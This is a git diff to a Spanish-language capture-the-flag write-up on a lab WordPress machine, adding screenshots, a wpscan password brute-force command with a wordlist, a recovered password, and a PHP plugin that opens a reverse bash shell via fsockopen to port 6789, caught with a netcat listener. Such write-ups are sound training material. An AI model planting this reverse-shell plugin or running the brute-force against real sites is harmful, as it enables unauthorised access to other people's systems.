@@ -24,6 +24,7 @@ En esta fase se realizaron tareas de reconocimiento activo y pasivo con el objet
 ```bash
 nmap -sC -sV -p- 10.10.116.128
 ```
+<img width="741" height="256" alt="image" src="https://github.com/user-attachments/assets/09740a12-ff55-4aaf-8ebe-4ba33684f9e4" />
 
 ### Resultado relevante:
 - **22/tcp**   → open|filtered (SSH)
@@ -38,7 +39,6 @@ wpscan --url http://10.10.116.128:4444 --enumerate u
 Resultado:
 - WordPress **5.1.19**
 - Usuario existente: **admin**
-- XML-RPC habilitado
 
 ## 1.3 Análisis inicial de superficie de ataque
 
@@ -48,7 +48,11 @@ Se descubrió la pista crítica `index.php/welcome`.
 Siguiendo las rutas cifradas se obtuvieron:
 - Archivos codificados (ROT13, Base64, XOR)
 - Wordlist interna (`keys.txt`)
+<img width="449" height="174" alt="Screenshot 2025-11-16 205420" src="https://github.com/user-attachments/assets/880a978e-358a-4323-978c-547eb97f6356" />
 - Nuevas rutas del reto
+<img width="529" height="217" alt="Screenshot 2025-11-16 205702" src="https://github.com/user-attachments/assets/4591e4c6-e531-41f3-bfd7-64dfa448974e" />
+<img width="1912" height="1820" alt="Screenshot 2025-11-16 203544" src="https://github.com/user-attachments/assets/b5bc9827-15bb-4649-9cf5-8f492d9f0874" />
+<img width="1883" height="1816" alt="Screenshot 2025-11-16 204652" src="https://github.com/user-attachments/assets/e3712ccc-a430-4e9e-a0c7-f671b46b42cc" />
 
 ---
 
@@ -113,14 +117,18 @@ Descifrado:
 ```bash
 openssl -camellia-192-cbc -pbkdf2 -iter 1001 -d -in wp_pass -out wp_pass.txt
 ```
-
+└─$ wpscan --url http://10.10.232.191:5353/wp-login.php --usernames admin --passwords keys.txt
 Contraseña obtenida:
+
+<img width="940" height="102" alt="image" src="https://github.com/user-attachments/assets/79c9a160-09ba-426a-964b-ecd63d60791d" />
 
 ```
 1FItkRieW!km@v7fI3
 ```
 
 WordPress real:
+
+<img width="940" height="333" alt="image" src="https://github.com/user-attachments/assets/0915c8b6-c184-45d8-bbd6-e270b794ddeb" />
 
 ```
 http://drcifrado.bs:5353/wp-login.php
@@ -156,9 +164,26 @@ Con esta contraseña se accede a una shell dentro del contenedor Docker.
 
 # 3. Escalada de privilegios
 
+He modificado un plugin de los que estaban disponibles en wordpres y ejecutandolo con el siguiente codigo he conseguido acceso a la terminal: 
+```
+<?php
+/*
+Plugin Name: Full TTY Reverse Shell
+Description: Stable reverse shell with proc_open.
+*/
+
+$sock=fsockopen("",6789);
+$proc=proc_open("/bin/bash -i", array(
+    0 => $sock,
+    1 => $sock,
+    2 => $sock
+), $pipes);
+?>
+```
+
 ## 3.1 Enumeración interna
 
-Acceso con Terminal:
+Acceso con Terminal en escucha tramite netcat -lvnp 6789 usuario www-data:
 
 ```
 www-data@container:/var/www/html$
